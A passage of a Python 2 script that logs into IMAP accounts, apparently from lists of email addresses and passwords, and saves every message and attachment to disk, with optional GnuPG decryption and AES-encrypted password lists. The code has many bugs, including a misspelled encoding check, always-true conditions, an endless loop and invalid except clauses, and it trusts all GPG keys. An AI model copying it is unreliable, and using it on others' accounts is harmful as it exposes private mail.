                  text = crypt
                  att = False
                  continue
               else:
                  enc = crypt['Content-Transfer-Encoding']
                  if crypt.get_content_type() == 'text/plain':
                     text = crypt.get_payload()
                     if 'base6s4' in enc:
                        text = base64.decodestring(text)
                        att = False
                        continue
                  elif crypt.get_content_type() == 'text/html':
                     html = unicode(crypt.get_payload(decode=True), str(charset), "ignore").encode('utf8', 'replace').strip()
                  else:
                     att = True
                     cryptdata = crypt.get_payload(decode=True) 
                     attachment = cryptdata
                     cryptname = crypt.get_filename()
                     if cryptname is None:
                        cryptname = msgfrom + ' - ' + msgsubject + ' - ' + '.gpg'
                     else:
                        cryptname = msgfrom + ' - ' + msgsubject + ' - ' + cryptname
                     att_path = os.path.join(att_dir, cryptname)
                     try:
                        if not os.path.exists(att_path):
                           cryptfile = open(att_path, 'wb+')
                           cryptfile.write(cryptdata)
                           cryptfile.close()
                           attfile = cryptfile
                           print('\n**********\nsaved attachment: %s \n' % cryptname)
                           logging.info('saved attachment: %s' % cryptname)
                        else:
                           cryptfile = open(att_path, 'rb+')
                           cryptdata = cryptfile.read()
                           print('\n%s exists, skipping... \n' % cryptname)
                           logging.info('%s exists, skipped..' % cryptname)
      
                     except e:
                        pass
                        print('\nan error has occurred: %s \n' % str(e))
                        logging.error('an error has occurred: %s' % str(e))
                        
            if 'use_gpg' not in locals():
               use_gpg = 0
               if use_gpg == 0:
                  if os.path.exists(gpgdir):
                     check_gpg = raw_input('would you like to decrypt messages encrypted with your GnuPG keyring? Y/N --> ')
                     while not re.match(r'^[yYnN]$', check_gpg):
                        check_gpg = raw_input('invalid entry. enter Y or N to decrypt messages --> ')
                     if check_gpg.lower() == 'y':
                        use_gpg = 1
                        logging.info('GPG decryption enabled')
                     else:
                        use_gpg = 0
                        logging.info('GPG decryption disabled')
               
            if use_gpg == 1:
               if 'application/octet-stream' in part.get_content_type():
                  crypt = part.get_payload(1)
                  print('\n***DOWNLOADING ENCRYPTED ATTACHMENTS*** \n')
                  gpg = gnupg.GPG(gnupghome=gpgdir, use_agent=True)
                  for ac in crypt:
                     acname = ac.get_filename()
                     decext = acname[-4:]
                     decfile = acname[:-4] + '-dec' + decext
                     decfilealt = acname[:-4] + '-decalt' + decext
                     decpath = os.path.join(att_dir, decfile)
                     decpathalt = os.path.join(att_dir, decfilealt)
                     print(decfile)
                     acdata = ac.get_payload(decode=True)
                     ec = gpg.decrypt(base64.decodestring(ac), always_trust=True, output=decpath)
                     ecdata = gpg.decrypt(base64.decodestring(acdata), always_trust=True, output=decpathalt)
                     logging.info('saved decrypted GPG data as: %s' % decfile)
                     print(ec)
                     print('\n')
                     raw_input('729 ec - press ENTER')
                     print(ecdata)
                     print('\n')
                     raw_input('732 ecdata - press ENTER')
                     attachment = acdata 
                     
                     if "multipart" or "alternative" in ac.get_content_type():
                        attachment = decode_email(ac)
                  
               elif 'pgp-encrypted' in part.get_content_type():
                  cryptmsg = part.get_payload(decode=True)
                  gpg = gnupg.GPG(gnupghome=gpgdir, use_agent=True)
                  decfile = part.get_filename()
                  if decfile is None:
                     decfile = mdate + '-' + msgfrom + '-' + msgsubject + '-dec.txt'
                  else:
                     dname = part.get_filename()
                     decext = dname[-4:]
                     decfile = dname[:-4] + '-dec' + decext
                     decpath = os.path.join(att_dir, decfile)
                     decrypted = gpg.decrypt(base64.decodestring(cryptmsg), always_trust=True, output=decpath)
                  print(decrypted)
                  raw_input('press ENTER to continue')
                  att = True
                  attachment = cryptmsg
               
               else:              
                  continue
      
      if att is False:
         decoded = msg.get_payload(decode=True)

         if html is None and text is not None:
            decoded = text.strip()
         elif html is None and text is None:
            decoded = msg
         else:
            decoded = html.strip()
      
      else:
         decoded = attachment
   
      return decoded                  
         
# END FUNCTION decode_email(msg)

# FUNCTION TO LOG ONTO IMAP SERVER AND GET EMAIL
def getimap(emailaddr, emailpass, imap_server, sslcon):

   imap_port = 993
   server = imaplib.IMAP4_SSL(imap_server, imap_port)

   if 'no' in sslcon:
      imap_port = 143
      server = imaplib.IMAP4(imap_server, imap_port)

   if 'gmail.com' in emailaddr and 'no' in sslcon:
      imap_port = 587

   attempts = 20
   
   completed.append(emailaddr)

   while True and attempts > 0:

      try:

         loginstatus, logindata = server.login(emailaddr, emailpass)

         if loginstatus == 'OK':

            select_info = server.select('INBOX')
            status, unseen = server.search(None, 'UNSEEN')
            typ, listdata = server.list()
            countunseen = len(unseen)

            if usecolor == 'color':

               print("\n\033[35m%d UNREAD MESSAGES\033[0m" % len(unseen))
               print()
               print('Response code: \n\033[32m', typ)
               print('\033[0m\nFOLDERS:\n\033[33m')
               for l in listdata:
                  print(str(l), '\n')
               print('\033[34m\nlogin successful, fetching emails.. \033[0m\n')

            else:

               print("%d UNREAD MESSAGES" % len(unseen))
               print()
               print('Response code: \n', typ)
               print('\nFOLDERS:\n')
               for l in listdata:
                  print(str(l), '\n')
               print('\nlogin successful, fetching emails.. \n')

            logging.info('LOGIN successful for %s.' % emailaddr)
            logging.info('%d unread messages in inbox' % countunseen)
            logging.info('fetching all messages...')

            # server.list()

            server.select()

            result, msgs = server.search(None, 'ALL')

            ids = msgs[0]
            id_list = ids.split()
            if len(id_list) > 0:
               latest_id = int(id_list[-1])
               first_id = int(id_list[0])
            else:
               latest_id = 0
               first_id = 0
            logging.info(str(latest_id) + ' total messages for ' + str(emailaddr))

            if usecolor == 'color':

               print(ac.OKGREEN + "TOTAL MESSAGES: " + ac.OKPINK + str(latest_id) + ac.CLEAR + "\n")
               print('\033[37m------------------------------------------------------------\n\033[0m')

            else:
            
               print("TOTAL MESSAGES: " + str(latest_id))

               print('------------------------------------------------------------')


            #homedir = os.path.expanduser("~")

            #rootdir = os.path.join(homedir, 'email-output')
            
            rootdir = savedir
            
            if not os.path.exists(rootdir):
               os.makedirs(rootdir, 0755)

            printdate = str(date.today())

            prev_file_name = emailaddr+"-headerlist-"+printdate+".txt"
            prev_complete_name = os.path.join(rootdir, prev_file_name)

            for email_uid in reversed(id_list):
            
               resp, data = server.fetch(email_uid, '(UID FLAGS BODY.PEEK[HEADER.FIELDS (FROM SUBJECT DATE)])')
               msgpreview = data[0][1]
               
               if usecolor == 'color':
                  
                  print('\n\033[35m' + str(email_uid) + '\033[0m\n')
                  print('\n\033[34;1m' + msgpreview + '\033[0m\n')

               else:
                  
                  print('\n%s \n' % str(email_uid))
                  print('\n%s \n' % str(msgpreview))

               prevfile = open(prev_complete_name, 'ab+')
               #   prevfile.write('Email headers for: ' + emailaddr + '\n')
               prevfile.write(email_uid)
               prevfile.write("\n")
               prevfile.write(msgpreview)
               prevfile.write("\n")
               #prevfile.close()
               
               result, rawdata = server.fetch(email_uid, '(RFC822)')

               rawbody = rawdata[0][1].strip()

               m = email.message_from_string(rawbody)

               msgfrom = m['From'].replace('/', '-')
               msgfrom = msgfrom.replace('<', ' ')
               msgfrom = msgfrom.replace('>', '')
               if m['Subject']:
                  msgsubject = m['Subject'].replace('/', '-')
               else:
                  msgsubject = 'No Subject'
               if decode_header(msgsubject) is not None:
                  decodedsubject = decode_header(msgsubject)[0]
               else:
                  decodedsubject = msgsubject
               decodedfrom = decode_header(msgfrom)[0]
               if (decodedsubject[1] != None):
                  msgsubject = unicode(decodedsubject[0], decodedsubject[1])
               msgsubject = u''.join(msgsubject).encode('utf-8').strip()
               msgsubject = msgsubject[:35].strip()
               def loopthrough(listobj):
                  for val in listobj:
                     print(str(val))
               if usecolor == 'color':
                  print('\n\033[32m')
                  loopthrough(decodedfrom)
                  print('\n\033[35m')
                  loopthrough(decodedsubject)
                  print('\n\033[0m')
               else:
                  loopthrough(decodedfrom)
                  print('\n')
                  loopthrough(decodedsubject)
                  print('\n')
               import sys  
               reload(sys)  
               sys.setdefaultencoding('utf8')
               if len(decodedfrom) > 1:
                  msgfrom = u'%s' % decodedfrom[0]
               msgfrom = u''.join(msgfrom).encode('utf8').strip()
               msgfrom = msgfrom[:30].strip()
               if (decodedfrom[1] != None):
                  msgfrom = unicode(msgfrom, decodedfrom[1])
               msgfrom = msgfrom.encode('utf-8')
               msgfrom = msgfrom[:35].strip()
               
               if not m.is_multipart():
                  print('\n***MSG PAYLOAD IS NOT MULTIPART*** \n')
                  body = m
                  
               elif m is None:
                  body = decode_email(m.get_payload(1))
               
               else: # multipart message
                  body = decode_email(m)
               
               # pad with 0's up to 3 digits
               emailid = str(email_uid).zfill(3)
               
               atdomain = re.search("@.*", emailaddr).group()
               emaildomain = atdomain[1:]
               j = len(emailaddr) - len(atdomain)
               user_save = emailaddr[:j]

               subdir =  user_save + "_" + emaildomain
               save_path = os.path.join(rootdir, subdir)

               if not os.path.exists(save_path):
                  os.makedirs(save_path)

               mbody = email.message_from_string(rawbody)
               
               isattach = False
               ext = ".htm"
               
               # CHECK IF MULTIPART #
               if mbody.is_multipart():

                  ext = ".txt"

                  for mpart in mbody.get_payload():

                     if 'plain' in mpart.get_content_type():
                        ext = ".txt"
                        isattach = False
                        att_path = save_path

                     elif mpart.get_content_type() == 'text/html':
                        ext = ".htm"
                        isattach = False
                        att_path = save_path
                     
                     else:                     
                        file_name = str(mpart.get_filename())

                        if 'encrypted' in mpart.get_content_type():
                           ext = ".asc"
                           isattach = True
                        
                        elif 'pgp-signature' in mpart.get_content_type():
                           ext = ".sig.asc"
                           isattach = True
                        
                        elif 'pkcs7-signature' in mpart.get_content_type():
                           ext = ".p7s"
                           isattach = True
                     
                        elif 'application' or 'octet-stream' in mpart.get_content_type():
                           ext = ".gpg"
                           isattach = True
                           
                        elif 'multipart' or 'alternative' in mpart.get_content_type():
                           ext = ".html"
                           isattach = True
                     
                        else:
                           ext = ".txt"
                           isattach = false
                           att_path = save_path
                           
                        if 'None' in file_name:
                           file_name = emailid + ' - ' + msgfrom + ' - ' + msgsubject + ext
                        
                        file_name = str(file_name)

               else:
                  isattach = False
                  att_path = save_path
               
               # CHECK FOR ATTACHMENT #
               if isattach is True:
                  att_path = os.path.join(save_path, 'attachments')
                  att_path = str(att_path)
                  if not os.path.exists(att_path):
                     os.makedirs(att_path)
                  if ext in (".asc", ".gpg", ".sig", ".sig.asc", ".p7s"):
                     if not file_name:
                        file_name = emailid + "-" + msgfrom + "--" + msgsubject + ext
                     file_name = str(file_name)
                     
                     if 'use_gpg' not in locals():
                        use_gpg = 0
                        if use_gpg == 0:
                           if os.path.exists(gpgdir):
                              check_gpg = raw_input('would you like to verify PGP signatures and decrypt messages encrypted with your GnuPG keyring? Y/N --> ')
                              while not re.match(r'^[yYnN]$', check_gpg):
                                 check_gpg = raw_input('invalid entry. enter Y or N to decrypt messages --> ')
                              if check_gpg.lower() == 'y':
                                 use_gpg = 1
                                 logging.info('email decryption with GnuPG keyring ENABLED.')
                              else:
                                 use_gpg = 0
                                 logging.info('email decryption with GnuPG keyring DISABLED.')
                           print('\n')
                  
               else:
                  file_name = emailid + "-" + msgfrom + " - " + msgsubject[:35] + ext
                  file_name = str(file_name)
                  att_path = str(save_path)
               
               complete_name = os.path.join(str(att_path), str(file_name))
               dtnow = datetime.now()
               dtdatetime = str(date.strftime(dtnow,"%m-%d-%Y %I:%M%p"))
               dtdate = str(date.strftime(dtnow,"%m-%d-%Y"))
               dttime = str(dtnow.hour) + ":" + str(dtnow.minute)

               if os.path.isfile(complete_name):

                  if usecolor == 'color':
                     print('\n\033[33m' + complete_name + '\033[0m already exists, skipping.. \n')
                  else:
                     print('\n' + complete_name + ' already exists, skipping.. \n')
                  logging.info('skipping existing file: %s' % complete_name)

               else:
               
                  if type(body) is str or type(body) is buffer and isattach is True:
                     if usecolor == 'color':
                        print('\n\033[34mdownloading file: \033[33m' + str(file_name) + '\033[0m\n')
                     else:
                        print('\ndownloading file: %s \n' + str(file_name))
                        
                     bodyfile = open(complete_name, 'wb+')
                     bodyfile.seek(0)
                     bodyfile.write(body)
                     bodyfile.close()

                  # EXTENSION: .ASC - ENCRYPTED PGP MESSAGE #
                  if ext == ".asc":
                     logging.info('downloading encrypted PGP message: %s' % str(file_name))
                     if usecolor == 'color':
                        print('\n\033[34mdownloading encrypted PGP message: \033[33m %s \033[0m\n' % str(file_name))
                     else:
                        print('\ndownloading encrypted PGP message: %s \n' % str(file_name))
                     
                     bodyfile = open(complete_name, 'wb+')
                     bodyfile.seek(0)
                     bodyfile.write(body)
                     bodyfile.close()
                     
                     # TRY TO DECRYPT AND VERIFY GPG SIGNATURES #
                     if use_gpg == 1:
                        gpg = gnupg.GPG(gnupghome=gpgdir, use_agent=True)
                        #rbodyfile = open(complete_name, 'rb+')
                        #rmsg = rbodyfile.read()
                        #rmsg = str(rmsg)
                        decrypted = complete_name[:-4] + '-dec.htm'
                        decryptext = complete_name[:-4] + '-dec.txt'
                        decrypted_data = gpg.decrypt(body, always_trust=True, output=decryptext)
                        #decrypted_data = gpg.decrypt_file(rbodyfile, always_trust=True)
                        if decrypted_data.trust_level is not None and decrypted_data.trust_level >= decrypted_data.TRUST_FULLY:
                           print('\ntrust level: %s \n' % decrypted_data.trust_text)
                        logging.info('trust level for message %s: %s - %s' % (complete_name, decrypted_data.trust_level, decrypted_data.trust_text))
                        logging.info('saved decrypted message: %s' % decrypted)
                        if usecolor == 'color':
                           print('\n\033[37mdecrypted message saved as: \033[32m%s \033[0m\n' % decrypted)
                        else:
                           print('\ndecrypted message saved as: %s \n' % decrypted)
                           
                  # EXTENSION: .GPG - ENCRYPTED FILE ATTACHMENTS #
                  elif ext == ".gpg":
                     
                     if type(body) is str:
                        gdecoded = body
                        
                     else:
                        
                        # MULTITYPE CHECK
                        multitypes = ['multipart', 'alternative', 'application', 'related']
                        g = body
                        
                        if type(body) is list:
                           g = body[0]
                           gdata = g.get_payload(decode=True)
                           gcontent_type = g.get_content_type()
                           gcharset = g.get_content_charset()
                           
                           if not os.path.isfile(complete_name):
                              try:
                                 writedata = open(complete_name, 'wb+')
                                 writedata.seek(0)
                                 writedata.write(gdata)
                                 writedata.close()
                                 print('\nsaved message data (try #1): %s \n' % complete_name)
                                 logging.info('saved messagae data: %s' % complete_name)
                              except:
                                 pass
                                 logging.warning('exception occurred while trying to save %s' % complete_name)
                                 try:
                                    writedata = open(complete_name, 'wb+')
                                    writedata.seek(0)
                                    writedata.write(g.get_payload())
                                    writedata.close()
                                    print('\nsaved message data (try #2): %s \n' % complete_name)
                                    logging.info('saved message data: %s' % complete_name)
                                 except e:
                                    pass
                                    print('\nan error has occurred: %s \n' % str(e))
                                    logging.error('an error occurred while trying to write file %s: %s' % (complete_name, str(e)))  
                           
                        gdecoded = g.get_payload()
   
                        # ENCODING & CHARSET CHECK
                        gcontent_type = g.get_content_type() 
                        gcharset = g.get_content_charset()
                           
                        print("\033[32mContent-Type: %s \nCharset: %s \n\033[0m" % (gcontent_type, gcharset))
                     
                        # plain text format
                        if gcontent_type == 'text/plain':
                           att = False
                           gdecoded = unicode(g.get_payload(decode=True), str(gcharset), "ignore").encode('utf8', 'replace').strip()
                           enc = msg['Content-Transfer-Encoding']
                           if enc == "base64":
                              gdecoded = g.get_payload()
                              gdecoded = base64.decodestring(gdecoded)

                        # rich text/html format
                        elif gcontent_type == 'text/html':
                           att = False
                           gdecoded = unicode(g.get_payload(decode=True), str(gcharset), "ignore").encode('utf8', 'replace').strip()
      
                        # attachment file(s)
                        if any(x in gcontent_type for x in multitypes):
                           #print("\033[35m***DEBUG*** \n\033[33mLINE 607: MULTITYPE: %s \n\033[0m" % content_type)
                           att = True
                           n = 0
                           glim = len(body) - 1 
                           
                           if type(body) is list:
                              gattfile = gdecoded[n].get_filename()
                              gattachment = gdecoded[n].get_payload()
                              gatt_contype = gdecoded[n].get_content_type()
                           else:
                              gatt_contype = body.get_content_type()
                              gattfile = body.get_filename()
                              gattachment = body.get_payload(decode=True)
                     
                           while gattfile is None and n < glim:
                              n += 1
                              gattfile = gdecoded[n].get_filename()
                              print("\033[95m\nDECODED ATTACHMENT FILE #%d: \033[33m%s \033[0m\n\n" % (n, gpgattfile))
                              gattachment = gdecoded[n].get_payload()
                              gatt_contype = gdecoded[n].get_content_type()
                           
                              # CHECK FOR MULTIPART CONTENT TYPE #
                              if 'multipart' in gatt_contype:
                                 for gatt in gattachment:
                                    gatt_data = gatt.get_payload(decode=True)
                                    gatt_type = gatt.get_content_type()
                                    if 'plain' in gatt_type:
                                       att_name = msgfrom + '-' + msgsubject + '.txt'
                                       att_dir = save_dir
                                    elif 'html' in gatt_type:
                                       att_name = msgfrom + '-' + msgsubject + '.html'
                                       att_dir = save_dir
                                    else: 
                                       att_name = gatt.get_filename()
                                       att_dir = os.path.join(save_dir, 'attachments')
                                       
                                    filename = os.path.join(att_dir, str(att_name))
                                    
                                    if not os.path.isfile(filename):
                                       try:
                                          writedata = open(filename, 'wb+')
                                          writedata.seek(0)
                                          writedata.write(gatt_data)
                                          writedata.close()
                                          print('\nsaved attachment (try #1): %s \n' % filename)
                                          logging.info('saved attachment: %s' % filename)
                                       except:
                                          pass
                                          logging.warning('exception occurred while trying to save %s' % filename)
                                          try:
                                             writedata = open(filename, 'wb+')
                                             writedata.seek(0)
                                             writedata.write(gatt.get_payload())
                                             writedata.close()
                                             print('\nsaved attachment (try #2): %s \n' % filename)
                                             logging.info('saved attachment: %s' % filename)
                                          except e:
                                             print('\nan error has occurred: %s \n' % str(e))
                                             logging.error('an error occurred while trying to write file %s: %s' % (filename, str(e)))  
                           
                           
                              else:
                                 if 'html' in gatt_contype:
                                    att_name = msgfrom + '-' + msgsubject + '-' + msgdate + '.html'
                                 elif 'plain' in gatt_contype:
                                    att_name = msgfrom + '-' + msgsubject + '-' + msgdate + '.txt'
                                 else:
                                    att_name = msgfrom + '-' + msgsubject + '-' + gattfile
                                 filename = os.path.join(att_dir, str(att_name))
                                 if not os.path.isfile(filename):
                                    try:
                                       writedata = open(filename, 'wb+')
                                       writedata.write(gattachment)
                                       writedata.close()
                                       print('\n\033[31m**attachment saved to file successfully*** \033[0m \nFILE LOCATION: %s \n' % filename)
                                       logging.info('saved attachment: %s' % filename)
                                    except:
                                       pass
                                       print('\n***skipped exception, MOVING ON.. \n')
                                       logging.warning('passed exception trying to save %s. trying again..' % filename)
                                       try:
                                          writedata = open(filename, 'wb+')
                                          writedata.write(gattachment.get_payload())
                                          writedata.close()
                                          print('\nsaved attachment: %s \n' % filename)
                                          logging.info('saved attachment: %s' % filename)
                                       except e:
                                          print('\nan error has occurred: %s \n' % str(e))
                                          logging.error('an error occurred while trying to write file %s: %s' % (filename, str(e)))  
                     
                     if use_gpg == 1:
                        gpg = gnupg.GPG(gnupghome=gpgdir, use_agent=True)
                        dfile = open(complete_name, 'rb+')
                        decrypted = complete_name + '-dec.txt'
                        decrypted_data = gpg.decrypt_file(dfile, always_trust=True, output=decrypted)
                        if decrypted_data.trust_level is not None and decrypted_data.trust_level >= decrypted_data.TRUST_FULLY:
                           print('\ntrust level: %s \n' % decrypted_data.trust_text)
                        logging.info('trust level for message %s: %s - %s' % (complete_name, decrypted_data.trust_level, decrypted_data.trust_text))
                        logging.info('saved decrypted message: %s' % decrypted)
                        if usecolor == 'color':
                           print('\n\033[37mdecrypted message saved as: \033[32m%s \033[0m\n' % decrypted)
                        else:
                           print('\ndecrypted message saved as: %s \n' % decrypted)
                  
                  elif ".sig" in ext:
                     if usecolor == 'color':
                        print('\n\033[34mdownloading PGP signature for sender: %s \033[0m\n' % msgfrom)
                     else:
                        print('\ndownloading PGP signature for sender: %s \n' % msgfrom)
                     logging.info('downloaded PGP signature for sender: %s' % msgfrom)
                     bodyfile = open(complete_name, 'wb+')
                     bodyfile.seek(0)
                     bodyfile.write(body)
                     bodyfile.close()
                     if use_gpg == 1:
                        print('\nverifying signature: %s \n' % str(file_name))
                        # gnupg.GPG(binary=None, homedir=None, verbose=False, use_agent=False, keyring=None, secring=None, options=None)
                        gpg = gnupg.GPG(verbose=True, use_agent=True)
                        verfile = open(complete_name, 'r+')
                        verify = gpg.verify(body)
                        if usecolor == 'color':
                           print(ac.GREENBOLD + '\n***verified***\n' + ac.CLEAR) if verify else print(ac.YELLOWBOLD + '\n***unverified***\n' + ac.CLEAR)
                        else:
                           print('\n***verified***\n') if verify else print('\n***unverified***\n')
                        if verify:
                           logging.info('signature verified for message: ' + str(file_name))
                        else:
                           logging.info('signature NOT VERIFIED for message: ' + str(file_name))
                        verfile.close()
                         
                  else:
                     if usecolor == 'color':
                        print('\n\033[34msaved message to file: \033[33m' + str(file_name) + '\033[0m\n')
                     else:
                        print('\nsaved message to file: %s \n' + str(file_name))
                     bodyfile = open(complete_name, 'wb+')
                     bodyfile.write("SENDER: \n")
                     bodyfile.write(msgfrom)
                     bodyfile.write('\n')
                     # bodyfile.write('Decoded:\n')
                     bodyfile.write(str(body))
                     bodyfile.write('\nRAW MESSAGE DATA:\n')
                     bodyfile.write(rawbody)
                     bodyfile.write('\n')
                     bodyfile.write('saved on: ' + dtdate + ', ' + dttime)
                     bodyfile.write('\n')
                     bodyfile.close()
               
               if usecolor == 'color':
                  print('\n\033[37m------------------------------------------------------------\033[0m\n')

               else:
                  print('\n------------------------------------------------------------\n')

            if usecolor == 'color':

               print('\n\033[32minbox contents successfully saved to file. YAY! \033[0m\n')

            else:

               print('\ninbox contents successfully saved to file. YAY!\n')
            
            logging.info('inbox contents for %s written to file.' % str(emailaddr))

         if usecolor == 'color':

            print('list of message previews saved as: \033[31m' + prev_complete_name + '\033[0m \n')

         else:

            print('list of message previews saved as: ', prev_complete_name)
         
         logging.info('message previews saved to file as %s' % str(prev_complete_name))

         print('logging out of account %s..\n' % emailaddr)

         server.logout()
         logging.info('logged out from %s' % emailaddr)

         print('logout successful.\n')
         # EXIT LOOP IF SUCCESSFULLY AUTHENTICATED
         attempts = -1
         break
      
      except server.abort as e:
         pass
         logging.error('IMAPLIB server abort: %s' % str(e))
         checkresp = 'ABORT'

         if usecolor == 'color':
            print('\033[32mconnection to IMAP server aborted.\033[0m\n')
            print('\033[36mIMAPLIB ERROR: \033[33m' + str(e) + '\033[0m\n')

         else:

            print('connection to IMAP server aborted.\n')
            print('IMAPLIB ERROR: ' + str(e) + '\n')
            
         attempts -= 1
         print('\ngetting inbox contents for: %s \n' % emailaddr)
         getimap(emailaddr, emailpass, imap_server, sslcon)
         break
         
      except server.error as e:
         pass
         logging.error('IMAPLIB ERROR: %s' % str(e))
         checkresp = 'ERROR'

         if usecolor == 'color':
            print('\033[32mconnection failed to IMAP server.\033[0m\n')
            print('\033[36mIMAPLIB ERROR: \033[33m' + str(e) + '\033[0m\n')

         else:

            print('connection failed to IMAP server.\n')
            print('IMAPLIB ERROR: ' + str(e) + '\n')
            
         attempts -= 1
         atdomain = re.search("@.*", emailaddr).group()
         emaildomain = atdomain[1:]
   
         getimap(emailaddr, emailpass, imap_server, sslcon)
         break
            
   if attempts is 0:
      print('ERROR: too many logon failures. unable to log onto IMAP server. quitting..')
      logging.error('too many logon failures for %s! could not authenticate to IMAP server: %s' % (emailaddr, imap_server))
      logging.error('reached maximum number of failed logon attempts. quitting program.')
      sys.exit(1)
# END OF FUNCTION getimap(emailaddr, emailpass, imap_server, sslcon)


############################
# MULTIPLE EMAIL ADDRESSES #
############################

if qtyemail == '2':
   emaillistfile = raw_input('please copy the email list file to the script directory, then enter filename --> ')
   while not os.path.isfile(emaillistfile):
      emaillistfile = raw_input('the file path specified does not exist or is not accessible. please check the file path and enter again --> ')
      logging.warning('email list file not found: %s' % str(emaillistfile))

   if os.path.exists(emaillistfile):
      print('\nfile found: %s \n' % emaillistfile)
      
   logging.info('using email list file %s' % str(emaillistfile))
   ef = open(emaillistfile, 'r+')
   ef.seek(0)
   emailfile = ef.readlines()
   eflen = len(emailfile)

   #######################
   # USING PASSWORD LIST #
   #######################
   
   if usewordlist.lower() == 'y':
      pwlistfile = raw_input('please make sure password list is in the script directory, then enter the filename --> ')
      while not os.path.isfile(pwlistfile):
         pwlistfile = raw_input('the path to the word list file you entered is not valid. please check the file and enter again --> ')
         logging.warning('invalid path for word list file: %s' % str(pwlistfile))

      print('')
      
      encryptsel = raw_input('is the word list encrypted using encryptlist.py? Y/N --> ')      
      while not re.match(r'^[nNyY]$', encryptsel):
         encryptsel = raw_input('invalid selection. enter Y if word list was encrypted using encryptlist.py or N if not encrypted --> ')
      
      print('')
      
      #############################
      # UNENCRYPTED PASSWORD LIST #
      #############################
      
      if encryptsel.lower() == 'n':
      
         b64sel = raw_input('is the word list base64-encoded using encodelist.py? Y/N --> ')
         while not re.search(r'^[nNyY]$', b64sel):
            b64sel = raw_input('invalid selection. enter Y if word list is base64-encoded or N if plain text --> ')
         
         print('')

         if b64sel.lower() == 'n':         
            gotoencsel = raw_input('storing passwords in plaintext is a security risk. \nenter 1 to encrypt the contents of your password list. \nenter 2 to use base64 encoding. enter 3 to continue with a plaintext password list. --> ')
            while not re.search(r'^[1-3]$', gotoencsel):
               gotoencsel = raw_input('invalid selection. enter 1 to run script to encrypt your password list. \nenter 2 to base64-encode it. or enter 3 to continue with plaintext list --> ')
            if gotoencsel == '1':
               print("\nlaunching encryptlist.py.. \n")
               logging.info('launched encryptlist.py')
               import encryptlist
               pwlistfile = encryptlist.encryptlist()
               encryptsel = 'y'
            elif gotoencsel == '2':
               newpwlistfile = raw_input('please enter a filename for the generated encoded list --> ')
               while not re.match(r'^[\w\-. ]+$', newpwlistfile):
                  newpwlistfile = raw_input("invalid format. please enter a valid filename --> ")
               print("\nlaunching encodelist.py.. \n")
               logging.info('launched encodelist.py')
               import encodelist
               pwlistfile = encodelist.encode_pass(pwlistfile, newpwlistfile)
               encodesel = 'y'
               pwlistfile = newpwlistfile
            else:
               logging.warning('password list stored in plain text is a security risk.')
               print('\n*** to encrypt your list in the future, run \'python encryptlist.py\'. to  base64-encode your list in the future, run \'python encodelist.py\' *** \n')
         else:
            logging.info('using base64 decoding for password list.')

      ###########################
      # ENCRYPTED PASSWORD LIST #
      ###########################
      
      if encryptsel.lower() == 'y':
      
         if os.path.isfile('secret.key'):
            if usecolor == 'color':
               keycheck = raw_input('base64-encoded key found at ' + ac.GREEN + 'secret.key' + ac.CLEAR + '. \nis the password list encrypted using this key? enter Y/N --> ')
            else:
               keycheck = raw_input('base64-encoded key found at secret.key. \nis the password list encrypted using this key? Y/N --> ')
            while not re.match(r'^[nNyY]$', keycheck):
               keycheck = raw_input('invalid selection. enter Y to use secret.key or N to enter another key file --> ')
            secretkey = 'secret.key'
            if keycheck.lower() == 'n':
               secretkey = raw_input('please enter the path to the key file used to encrypt your password list --> ')
               while not os.path.isfile(secretkey):
                  secretkey = raw_input('file not found. please check the path and enter again --> ')
            logging.info('using encryption key file %s to decrypt word list.' % str(secretkey))
      
         else:
            cwdir = os.getcwd()
            import glob
            keyfiles = glob.glob('*.key')
            if len(keyfiles) == 1:
               secretkey = keyfiles[0]
               if usecolor == 'color':
                  print(ac.YELLOW + '\nFOUND ENCRYPTION KEY in current directory (' + ac.PINKBOLD + str(cwdir) + ac.CLEAR + ac.YELLOW + '): ' + ac.BLUEBOLD + secretkey + ac.CLEAR + '\n')
               else:
                  print('\nFOUND ENCRYPTION KEY in current directory (%s): %s \n' % (str(cwdir), secretkey)) 
               checkkey = raw_input('is this the correct key file used to encrypt your word list? enter Y/N --> ')
               while not re.match(r'^[nNyY]$', checkkey):
                  checkkey = raw_input('invalid entry. enter Y or N --> ')
               if checkkey.lower() == 'n':
                  secretkey = raw_input('please enter the complete path to the correct key file used to encrypt your word list --> ')
                  while not os.path.isfile(secretkey):
                     secretkey = raw_input('file not found. please check the path and enter again --> ')
            elif len(keyfiles) > 1:
               if usecolor == 'color':
                  print(ac.YELLOWBOLD + '\nFOUND MULTIPLE ENCRYPTION KEYS in the current working directory (' + ac.PINKBOLD + str(cwdir) + ac.YELLOWBOLD + '):' + ac.CLEAR)
               else:
                  print('\nFOUND MULTIPLE ENCRYPTION KEYS in the current working directory (%s):' % str(cwdir))
               i = 0
               while i < len(keyfiles):
                  print('%d - %s' % (i + 1, keyfiles[i]))
               print('\n*****  *****  *****  *****  *****  *****  *****  *****\n')
               for kf in keyfiles:
                  print(kf)
                  print('\n')
               print('\n')
               secretkey = raw_input('please enter the key file used to encrypt your word list --> ')
               while not os.path.isfile(secretkey):
                  secretkey = raw_input('file not found. please check the path and enter it again --> ')
               
            else:
               if usecolor == 'color':
                  print(ac.YELLOWBOLD + '\nWARNING: cannot find any encryption key files in the current working directory (' + ac.PINKBOLD + str(cwdir) + ac.YELLOWBOLD + ')!\n' + ac.CLEAR)
               else:
                  print('\nWARNING: cannot find any encryption key files in the current working directory (%s)!\n' % str(cwdir))
               secretkey = raw_input('please enter the path to the key file used to encrypt your password list --> ')
               while not os.path.isfile(secretkey):
                  secretkey = raw_input('file not found. please check the path and enter it again --> ')
            
         logging.info('using encryption key file %s to decrypt word list.' % str(secretkey))
         if usecolor == 'color':
            print(ac.PINKBOLD + '\n\n********************************************************************************')
            print(ac.YELLOWBOLD)
         print('*** EMAIL2FILE CANNOT VALIDATE IF A PASSPHRASE IS CORRECT OR INCORRECT. WRONG PASSPHRASES WILL SIMPLY RESULT IN MALFORMED DATA WHILE ATTEMPTING TO DECRYPT. ***\n')
         if usecolor == 'color':
            print(ac.PINKBOLD + '******************************************************************************** \n\n')
            print(ac.CLEAR)
         encpass = getpass.getpass('please enter the secret passphrase used to generate the encrypted file --> ')
         AES_Dec = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip('&')
         cryptfile = open(secretkey, 'r')
         a = cryptfile.readline()
         cryptkey = base64.b64decode(a)
         cryptfile.close()

         secretpadlen = 16 - (len(encpass) % 16)
         secret = encpass + ('&' * secretpadlen)
         cipher = AES.new(cryptkey, AES.MODE_CBC, secret)
         print('\nusing encryption key: ')
         if usecolor == 'color':
            print(ac.PINKBOLD + a + ac.CLEAR)
